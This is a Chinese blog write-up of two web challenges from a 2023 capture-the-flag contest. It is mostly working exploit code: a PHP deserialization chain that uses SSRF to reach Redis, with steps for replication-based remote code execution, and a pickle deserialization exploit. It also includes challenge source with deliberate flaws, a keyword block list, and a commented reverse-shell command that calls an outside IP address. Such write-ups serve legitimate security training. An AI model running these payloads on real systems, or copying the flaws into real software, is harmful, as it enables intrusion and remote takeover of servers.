<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>2023年春秋杯网络安全联赛冬季赛 Web Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="2023年春秋杯网络安全联赛冬季赛 Web Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/02/10/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B%20Web%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-02-10T06:57:28.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>February</span>
            <span>10,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">2023年春秋杯网络安全联赛冬季赛 Web Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="ezezez-php"><a href="#ezezez-php" class="headerlink" title="ezezez_php"></a>ezezez_php</h1><p>考点：Redis主从复制 rce、SSRF<br>这一题没环境复现了，直接发一下mochu的exp，这题我也没打，因为都在看ActiveMQ那道题，还没解出来是最草的，我太菜了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// echo &quot;All matters have concluded&quot;.&quot;&lt;/br&gt;&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$arg</span>[<span class="number">0</span>][<span class="string">&#x27;POC&#x27;</span>] == <span class="string">&quot;0.o&quot;</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;cl-&gt;var1 = <span class="string">&quot;get&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;payload = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$paylaod</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Have you genuinely accomplished what you set out to do?&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$paylaod</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;symbol = True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;   </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;Flag)))&#123;</span><br><span class="line">               <span class="variable">$value</span>(<span class="variable language_">$this</span>-&gt;Flag);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;NoNoNo,please you can look hint.php&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// echo $this-&gt;start1 . &quot;__construct&quot; . &quot;&lt;/br&gt;&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start2 === <span class="string">&quot;o.0&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;start1-&gt;<span class="title function_ invoke__">Love</span>(<span class="variable">$this</span>-&gt;start);</span><br><span class="line">            <span class="comment">// echo &quot;You are Good!&quot;.&quot;&lt;/br&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// $url=base64_decode($url);</span></span><br><span class="line">    <span class="comment">// var_dump($url);</span></span><br><span class="line">    <span class="comment">// $ch = curl_init();</span></span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span></span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_HEADER, 0);</span></span><br><span class="line">    <span class="comment">// $output = curl_exec($ch);</span></span><br><span class="line">    <span class="comment">// $result_info = curl_getinfo($ch);</span></span><br><span class="line">    <span class="comment">// var_dump($result_info);</span></span><br><span class="line">    <span class="comment">// curl_close($ch);</span></span><br><span class="line">    <span class="comment">// var_dump($output);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ha::__destruct() -&gt; Rd::__call() -&gt; Er::__set() -&gt; get()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// payload 按顺序发，公网上建好evil redis-server</span></span><br><span class="line"><span class="comment">// $payload = &quot;dict://127.0.0.1:6379/config:set:dir:/tmp&quot;;</span></span><br><span class="line"><span class="comment">// $payload = &quot;dict://127.0.0.1:6379/config:set:dbfilename:exp.so&quot;;</span></span><br><span class="line"><span class="comment">// $payload = &quot;dict://127.0.0.1:6379/slaveof:x.x.x.x:7777&quot;;</span></span><br><span class="line"><span class="comment">// $payload = &quot;dict://127.0.0.1:6379/module:load:/tmp/exp.so&quot;;</span></span><br><span class="line"><span class="comment">// $payload = &quot;dict://127.0.0.1:6379/slave:no:one&quot;;</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;dict://127.0.0.1:6379/system.exec:env&quot;</span>;</span><br><span class="line"><span class="variable">$Er</span> = <span class="keyword">new</span> <span class="title class_">Er</span>();</span><br><span class="line"><span class="variable">$Er</span> -&gt; Flag = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$Rd</span> = <span class="keyword">new</span> <span class="title class_">Rd</span>();</span><br><span class="line"><span class="variable">$Rd</span> -&gt; cl = <span class="variable">$Er</span>;</span><br><span class="line"><span class="variable">$Ha</span> = <span class="keyword">new</span> <span class="title class_">Ha</span>();</span><br><span class="line"><span class="variable">$Ha</span> -&gt; start = [<span class="string">&#x27;POC&#x27;</span>=&gt;<span class="string">&#x27;0.o&#x27;</span>];</span><br><span class="line"><span class="variable">$Ha</span> -&gt; start1 = <span class="variable">$Rd</span>;</span><br><span class="line"><span class="variable">$Ha</span> -&gt; start2 = <span class="string">&#x27;o.0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$Ha</span>));</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="picup"><a href="#picup" class="headerlink" title="picup"></a>picup</h1><p>考点：pickle反序列化、格式化字符串、任意文件读取<br>一个套题，题目源码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2024/1/20</span></span><br><span class="line"><span class="comment"># @Author  : Boogipop</span></span><br><span class="line"><span class="comment"># @Github  : http://github.com/Boogipop</span></span><br><span class="line"><span class="comment"># @File    : demo.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,session,render_template,redirect</span><br><span class="line"><span class="keyword">from</span> Users <span class="keyword">import</span> Users</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"></span><br><span class="line">users=Users()</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line">app.template_folder=<span class="string">&quot;./&quot;</span></span><br><span class="line">app.secret_key=users.passwords[<span class="string">&#x27;admin&#x27;</span>]=hashlib.md5(os.urandom(<span class="number">32</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;login.php&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">in</span> request.files <span class="keyword">and</span> (filename:=waf(request.files[<span class="string">&#x27;file&#x27;</span>])):</span><br><span class="line">        filepath=os.path.join(<span class="string">&quot;./uploads&quot;</span>,filename)</span><br><span class="line">        request.files[<span class="string">&#x27;file&#x27;</span>].save(filepath)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File upload success! Path: &lt;a href=&#x27;pic.php?pic=&quot;</span>+filename+<span class="string">&quot;&#x27;&gt;&quot;</span>+filepath+<span class="string">&quot;&lt;/a&gt;.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> (username:=request.form.get(<span class="string">&#x27;username&#x27;</span>)) <span class="keyword">and</span> (password:=request.form.get(<span class="string">&#x27;password&#x27;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(username)==<span class="built_in">str</span> <span class="keyword">and</span> <span class="built_in">type</span>(password)==<span class="built_in">str</span> <span class="keyword">and</span> users.login(username,password):</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>]=username</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login success! &lt;a href=&#x27;/&#x27;&gt;Click here to redirect.&lt;/a&gt;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login fail!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> (username:=request.form.get(<span class="string">&#x27;username&#x27;</span>)) <span class="keyword">and</span> (password:=request.form.get(<span class="string">&#x27;password&#x27;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(username)==<span class="built_in">str</span> <span class="keyword">and</span> <span class="built_in">type</span>(password)==<span class="built_in">str</span> <span class="keyword">and</span> <span class="keyword">not</span> username.isnumeric() <span class="keyword">and</span> users.register(username,password):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register successs! Your username is &#123;username&#125; with hash: &#123;&#123;users.passwords[&#123;username&#125;]&#125;&#125;.&quot;</span>.<span class="built_in">format</span>(username=username).<span class="built_in">format</span>(users=users)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register fail!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pic.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pic</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;login.php&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (pic:=request.args.get(<span class="string">&#x27;pic&#x27;</span>)) <span class="keyword">and</span> os.path.isfile(filepath:=<span class="string">&quot;./uploads/&quot;</span>+pic.replace(<span class="string">&quot;../&quot;</span>,<span class="string">&quot;&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>)==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> pickle.load(<span class="built_in">open</span>(filepath,<span class="string">&quot;rb&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;img src=&quot;data:image/png;base64,&#x27;&#x27;&#x27;</span>+base64.b64encode(<span class="built_in">open</span>(filepath,<span class="string">&quot;rb&quot;</span>).read()).decode()+<span class="string">&#x27;&#x27;&#x27;&quot;&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">    res=<span class="string">&quot;&lt;h1&gt;files in ./uploads/&lt;/h1&gt;&lt;br&gt;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(<span class="string">&quot;./uploads&quot;</span>):</span><br><span class="line">        res+=<span class="string">&quot;&lt;a href=&#x27;pic.php?pic=&quot;</span>+f+<span class="string">&quot;&#x27;&gt;./uploads/&quot;</span>+f+<span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>waf.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">content</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># content=file.read().lower()</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(content)&gt;=<span class="number">70</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> [<span class="string">b&quot;\n&quot;</span>,<span class="string">b&quot;\r&quot;</span>,<span class="string">b&quot;\\&quot;</span>,<span class="string">b&quot;base&quot;</span>,<span class="string">b&quot;builtin&quot;</span>,<span class="string">b&quot;code&quot;</span>,<span class="string">b&quot;command&quot;</span>,<span class="string">b&quot;eval&quot;</span>,<span class="string">b&quot;exec&quot;</span>,<span class="string">b&quot;flag&quot;</span>,<span class="string">b&quot;global&quot;</span>,<span class="string">b&quot;os&quot;</span>,<span class="string">b&quot;output&quot;</span>,<span class="string">b&quot;popen&quot;</span>,<span class="string">b&quot;pty&quot;</span>,<span class="string">b&quot;repeat&quot;</span>,<span class="string">b&quot;run&quot;</span>,<span class="string">b&quot;setstate&quot;</span>,<span class="string">b&quot;spawn&quot;</span>,<span class="string">b&quot;subprocess&quot;</span>,<span class="string">b&quot;sys&quot;</span>,<span class="string">b&quot;system&quot;</span>,<span class="string">b&quot;timeit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> b <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> secure_filename(content.filename)</span><br></pre></td></tr></table></figure>
<p>首先是任意文件读取才可以读到源码，要双写绕过一下。之后可以发现有个session伪造、格式化字符串、pickle反序列化，一系列的叠加态，是一个不折不扣的套题。<br>至于绕过waf这里有2点，第一点是怎么绕过换行符，<code>pickle.load</code>有一个protocol选项，我们将其设置为4就不会出现换行，那么第二个点就是绕过关键字的问题，常规的os库，eval、exec都被ban了，这个时候也其实没啥问题，因为我们是flask框架，有render_template函数，所以exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 未导入os模块，通用</span></span><br><span class="line">        <span class="comment"># return (render_template, (&#x27;whoami&#x27;,))</span></span><br><span class="line">        <span class="keyword">return</span> (render_template, (<span class="string">&#x27;./uploads/l&#x27;</span>,))</span><br><span class="line"><span class="comment">#bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.130.24.188/7775 &lt;&amp;1&quot;</span></span><br><span class="line">admin = Person(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">result = pickle.dumps(admin,protocol=<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(result))</span><br><span class="line">code=<span class="string">b&#x27;\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x10flask.templating\x94\x8c\x0frender_template\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(result)</span><br></pre></td></tr></table></figure>
<p>格式化字符串漏洞在注册阶段，直接<code>&#123;users.passwords&#125;</code>就可以看到管理员密码</p>
